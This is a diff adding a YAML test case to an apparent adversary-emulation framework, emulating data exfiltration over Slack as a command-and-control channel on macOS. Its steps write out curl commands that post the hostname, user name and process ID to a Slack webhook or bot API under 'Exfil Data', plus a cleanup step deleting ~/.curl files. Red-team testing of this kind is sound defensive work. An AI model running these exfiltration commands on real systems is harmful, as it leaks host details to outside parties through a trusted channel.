@@ -1,0 +1,87 @@
+api_version: 2.0
+id: 009-slack-message-exfiltration
+name: Slack Message Exfiltration
+description: Tests data exfiltration via Slack messages as C2 channel
+type: command_and_control
+
+requirements:
+  platforms:
+    - os: darwin
+
+args:
+  - name: slack_webhook_url
+    type: string
+    description: Slack webhook URL for posting messages
+    default: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
+  - name: slack_channel
+    type: string
+    description: Slack channel for exfiltration
+    default: "#c2-channel"
+  - name: slack_bot_token
+    type: string
+    description: Slack bot token (alternative to webhook)
+    default: "xoxb-token-here"
+  - name: timeout
+    type: integer
+    description: Request timeout in seconds
+    default: 10
+
+steps:
+  - name: validate_slack_webhook
+    description: Validate Slack webhook URL format
+    command: |
+      if [[ "{{ slack_webhook_url }}" =~ hooks.slack.com ]]; then
+        echo "Valid Slack webhook URL format"
+      else
+        echo "Invalid webhook URL"
+      fi
+    type: command
+  
+  - name: send_exfil_message_webhook
+    description: Send exfiltration message via webhook
+    command: |
+      curl -s -X POST "{{ slack_webhook_url }}" \
+        --max-time {{ timeout }} \
+        -H "Content-Type: application/json" \
+        -d "{\"text\":\"System Info\",\"blocks\":[{\"type\":\"section\",\"text\":{\"type\":\"mrkdwn\",\"text\":\"*Hostname:*\n\`$(hostname)\`\n*User:*\n\`$(whoami)\`\n*PID:*\n\`$$\`\"}}]}" \
+        -w "\nHTTP Status: %{http_code}\n"
+    type: command
+  
+  - name: send_data_via_slack_api
+    description: Send exfiltration data via Slack API
+    command: |
+      if [ -n "{{ slack_bot_token }}" ] && [ "{{ slack_bot_token }}" != "xoxb-token-here" ]; then
+        curl -s -X POST "https://slack.com/api/chat.postMessage" \
+          --max-time {{ timeout }} \
+          -H "Authorization: Bearer {{ slack_bot_token }}" \
+          -H "Content-Type: application/json" \
+          -d "{\"channel\":\"{{ slack_channel }}\",\"text\":\"Exfil Data: hostname=$(hostname) user=$(whoami)\"}" \
+          -w "\nHTTP Status: %{http_code}\n"
+      else
+        echo "Slack API token not configured"
+      fi
+    type: command
+    cleanup: true
+
+checks:
+  - name: verify_slack_connectivity
+    description: Verify Slack connectivity
+    condition: |
+      Should receive HTTP 200 response or similar
+    type: output_validation
+
+test_type: dry_run
+
+cleanup:
+  - name: clear_slack_cache
+    description: Clear any Slack connection cache
+    command: |
+      rm -f ~/.curl/* 2>/dev/null || true
+    type: command
+    optional: true
+
+metadata:
+  created: 2026-01-30
+  author: Claude Code
+  severity: high
+  category: exfiltration
